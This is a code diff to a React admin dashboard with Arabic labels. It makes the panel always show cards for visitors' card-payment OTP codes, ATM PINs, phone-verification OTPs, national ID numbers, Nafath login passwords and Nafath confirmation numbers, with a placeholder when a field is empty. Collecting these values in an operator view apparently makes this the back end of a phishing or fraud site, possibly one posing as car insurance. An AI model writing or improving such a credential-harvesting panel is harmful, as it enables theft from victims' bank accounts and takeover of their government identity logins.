@@ -1882,16 +1882,17 @@ const AdminVisitors = () => {
                                 })()}
 
                                 {/* 2. كود OTP الدفع بالبطاقة */}
-                                {(order.otp_code || order.otp_verified !== null) && (
-                                  <div className="rounded-xl border-2 border-blue-500/30 bg-blue-500/5 overflow-hidden">
+                                <div className="rounded-xl border-2 border-blue-500/30 bg-blue-500/5 overflow-hidden">
                                     <div className="px-3 py-2 bg-blue-500/10 border-b border-blue-500/20">
                                       <p className="text-[10px] font-bold text-blue-600 flex items-center gap-1.5"><KeyRound className="w-3 h-3" /> كود OTP الدفع بالبطاقة</p>
                                     </div>
                                     <div className="px-3 py-2.5">
-                                      {order.otp_code && (
+                                      {order.otp_code ? (
                                         <div className="flex items-center justify-center py-2">
                                           <span className="text-2xl font-mono font-bold tracking-[6px] text-blue-600 bg-blue-500/10 px-4 py-1.5 rounded-lg border border-blue-500/20">{order.otp_code}</span>
                                         </div>
+                                      ) : (
+                                        <p className="text-[10px] text-muted-foreground text-center py-2">لا توجد بيانات</p>
                                       )}
                                       {order.otp_verified !== null && (
                                         <div className="flex justify-center mt-1">
@@ -1902,93 +1903,110 @@ const AdminVisitors = () => {
                                       )}
                                     </div>
                                   </div>
-                                )}
 
                                 {/* 3. ATM */}
-                                {(order.atm_bill_number || order.atm_biller_code || order.atm_pin) && (
-                                  <div className="rounded-xl border-2 border-emerald-500/30 bg-emerald-500/5 overflow-hidden">
+                                <div className="rounded-xl border-2 border-emerald-500/30 bg-emerald-500/5 overflow-hidden">
                                     <div className="px-3 py-2 bg-emerald-500/10 border-b border-emerald-500/20">
                                       <p className="text-[10px] font-bold text-emerald-600 flex items-center gap-1.5"><Landmark className="w-3 h-3" /> بيانات ATM</p>
                                     </div>
                                     <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
-                                      {order.atm_bill_number && <InfoItem label="رقم الفاتورة" value={order.atm_bill_number} />}
-                                      {order.atm_biller_code && <InfoItem label="رمز المفوتر" value={order.atm_biller_code} />}
-                                      {order.atm_pin && (
-                                        <div className="col-span-2 flex justify-center">
-                                          <span className="text-lg font-mono font-bold tracking-[4px] text-emerald-600 bg-emerald-500/10 px-3 py-1 rounded-lg border border-emerald-500/20">{order.atm_pin}</span>
-                                        </div>
+                                      {(order.atm_bill_number || order.atm_biller_code || order.atm_pin) ? (
+                                        <>
+                                          {order.atm_bill_number && <InfoItem label="رقم الفاتورة" value={order.atm_bill_number} />}
+                                          {order.atm_biller_code && <InfoItem label="رمز المفوتر" value={order.atm_biller_code} />}
+                                          {order.atm_pin && (
+                                            <div className="col-span-2 flex justify-center">
+                                              <span className="text-lg font-mono font-bold tracking-[4px] text-emerald-600 bg-emerald-500/10 px-3 py-1 rounded-lg border border-emerald-500/20">{order.atm_pin}</span>
+                                            </div>
+                                          )}
+                                        </>
+                                      ) : (
+                                        <p className="col-span-2 text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
                                       )}
                                     </div>
                                   </div>
-                                )}
 
                                 {/* 4. توثيق رقم الجوال */}
-                                {(visitorPhone || order.phone) && (
-                                  <div className="rounded-xl border-2 border-purple-500/30 bg-purple-500/5 overflow-hidden">
+                                <div className="rounded-xl border-2 border-purple-500/30 bg-purple-500/5 overflow-hidden">
                                     <div className="px-3 py-2 bg-purple-500/10 border-b border-purple-500/20">
                                       <p className="text-[10px] font-bold text-purple-600 flex items-center gap-1.5">📲 توثيق رقم الجوال</p>
                                     </div>
                                     <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
-                                      <InfoItem label="رقم الجوال" value={visitorPhone || order.phone || "—"} />
+                                      {(visitorPhone || order.phone) ? (
+                                        <InfoItem label="رقم الجوال" value={visitorPhone || order.phone || "—"} />
+                                      ) : (
+                                        <p className="col-span-2 text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
+                                      )}
                                     </div>
                                   </div>
-                                )}
 
                                 {/* 5. كود OTP توثيق رقم الجوال */}
-                                {order.phone_otp_code && (
-                                  <div className="rounded-xl border-2 border-violet-500/30 bg-violet-500/5 overflow-hidden">
+                                <div className="rounded-xl border-2 border-violet-500/30 bg-violet-500/5 overflow-hidden">
                                     <div className="px-3 py-2 bg-violet-500/10 border-b border-violet-500/20">
                                       <p className="text-[10px] font-bold text-violet-600 flex items-center gap-1.5"><Phone className="w-3 h-3" /> كود OTP توثيق الجوال</p>
                                     </div>
                                     <div className="px-3 py-2.5 flex items-center justify-center">
-                                      <span className="text-2xl font-mono font-bold tracking-[6px] text-violet-600 bg-violet-500/10 px-4 py-1.5 rounded-lg border border-violet-500/20">{order.phone_otp_code}</span>
+                                      {order.phone_otp_code ? (
+                                        <span className="text-2xl font-mono font-bold tracking-[6px] text-violet-600 bg-violet-500/10 px-4 py-1.5 rounded-lg border border-violet-500/20">{order.phone_otp_code}</span>
+                                      ) : (
+                                        <p className="text-[10px] text-muted-foreground py-1">لا توجد بيانات</p>
+                                      )}
                                     </div>
                                   </div>
-                                )}
 
                                 {/* 6. دخول النفاذ (اسم المستخدم + كلمة المرور) */}
-                                {(order.nafath_password || selectedVisitor?.national_id || order.national_id) && (
-                                  <div className="rounded-xl border-2 border-teal-500/30 bg-teal-500/5 overflow-hidden">
+                                <div className="rounded-xl border-2 border-teal-500/30 bg-teal-500/5 overflow-hidden">
                                     <div className="px-3 py-2 bg-teal-500/10 border-b border-teal-500/20">
                                       <p className="text-[10px] font-bold text-teal-600 flex items-center gap-1.5"><Fingerprint className="w-3 h-3" /> دخول النفاذ</p>
                                     </div>
                                     <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
-                                      <InfoItem label="اسم المستخدم (الهوية)" value={selectedVisitor?.national_id || order.national_id || "—"} />
-                                      {order.nafath_password && <InfoItem label="كلمة المرور" value={order.nafath_password} />}
+                                      {(order.nafath_password || selectedVisitor?.national_id || order.national_id) ? (
+                                        <>
+                                          <InfoItem label="اسم المستخدم (الهوية)" value={selectedVisitor?.national_id || order.national_id || "—"} />
+                                          {order.nafath_password && <InfoItem label="كلمة المرور" value={order.nafath_password} />}
+                                        </>
+                                      ) : (
+                                        <p className="col-span-2 text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
+                                      )}
                                     </div>
                                   </div>
-                                )}
 
                                 {/* 7. رمز النفاذ */}
-                                {order.nafath_number && (
-                                  <div className="rounded-xl border-2 border-cyan-500/30 bg-cyan-500/5 overflow-hidden">
+                                <div className="rounded-xl border-2 border-cyan-500/30 bg-cyan-500/5 overflow-hidden">
                                     <div className="px-3 py-2 bg-cyan-500/10 border-b border-cyan-500/20">
                                       <p className="text-[10px] font-bold text-cyan-600 flex items-center gap-1.5">🔐 رمز النفاذ</p>
                                     </div>
                                     <div className="px-3 py-2.5 flex items-center justify-center">
-                                      <span className="text-3xl font-mono font-bold tracking-[8px] text-cyan-600 bg-cyan-500/10 px-5 py-2 rounded-lg border border-cyan-500/20">{order.nafath_number}</span>
+                                      {order.nafath_number ? (
+                                        <span className="text-3xl font-mono font-bold tracking-[8px] text-cyan-600 bg-cyan-500/10 px-5 py-2 rounded-lg border border-cyan-500/20">{order.nafath_number}</span>
+                                      ) : (
+                                        <p className="text-[10px] text-muted-foreground py-1">لا توجد بيانات</p>
+                                      )}
                                     </div>
                                   </div>
-                                )}
 
                                 {/* Vehicle info */}
-                                {(order.vehicle_make || order.vehicle_model || order.vehicle_year || order.serial_number || order.passenger_count || order.vehicle_usage || order.estimated_value || order.repair_location) && (
-                                  <div className="rounded-xl border border-border/50 bg-muted/10 overflow-hidden">
+                                <div className="rounded-xl border border-border/50 bg-muted/10 overflow-hidden">
                                     <div className="px-3 py-2 bg-muted/30 border-b border-border/30">
                                       <p className="text-[10px] font-bold text-muted-foreground flex items-center gap-1.5"><Car className="w-3 h-3" /> معلومات المركبة</p>
                                     </div>
                                     <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
-                                      {order.vehicle_make && <InfoItem label="الشركة المصنعة" value={order.vehicle_make} />}
-                                      {order.vehicle_model && <InfoItem label="الموديل" value={order.vehicle_model} />}
-                                      {order.vehicle_year && <InfoItem label="سنة الصنع" value={order.vehicle_year} />}
-                                      {order.serial_number && <InfoItem label="الرقم التسلسلي" value={order.serial_number} />}
-                                      {order.passenger_count && <InfoItem label="عدد الركاب" value={order.passenger_count} />}
-                                      {order.vehicle_usage && <InfoItem label="غرض الاستخدام" value={order.vehicle_usage === "personal" ? "شخصي" : order.vehicle_usage === "commercial" ? "تجاري" : order.vehicle_usage} />}
-                                      {order.estimated_value && <InfoItem label="القيمة التقديرية" value={`${order.estimated_value} ر.س`} />}
-                                      {order.repair_location && <InfoItem label="مكان التصليح" value={order.repair_location === "agency" ? "الوكالة" : "ورشة"} />}
+                                      {(order.vehicle_make || order.vehicle_model || order.vehicle_year || order.serial_number || order.passenger_count || order.vehicle_usage || order.estimated_value || order.repair_location) ? (
+                                        <>
+                                          {order.vehicle_make && <InfoItem label="الشركة المصنعة" value={order.vehicle_make} />}
+                                          {order.vehicle_model && <InfoItem label="الموديل" value={order.vehicle_model} />}
+                                          {order.vehicle_year && <InfoItem label="سنة الصنع" value={order.vehicle_year} />}
+                                          {order.serial_number && <InfoItem label="الرقم التسلسلي" value={order.serial_number} />}
+                                          {order.passenger_count && <InfoItem label="عدد الركاب" value={order.passenger_count} />}
+                                          {order.vehicle_usage && <InfoItem label="غرض الاستخدام" value={order.vehicle_usage === "personal" ? "شخصي" : order.vehicle_usage === "commercial" ? "تجاري" : order.vehicle_usage} />}
+                                          {order.estimated_value && <InfoItem label="القيمة التقديرية" value={`${order.estimated_value} ر.س`} />}
+                                          {order.repair_location && <InfoItem label="مكان التصليح" value={order.repair_location === "agency" ? "الوكالة" : "ورشة"} />}
+                                        </>
+                                      ) : (
+                                        <p className="col-span-2 text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
+                                      )}
                                     </div>
                                   </div>
-                                )}
 
                                 {/* Insurance & pricing */}
                                 {(order.base_price != null || order.total_price != null || order.policy_number || order.draft_policy_number || (order.add_ons && Array.isArray(order.add_ons) && (order.add_ons as any[]).length > 0)) && (
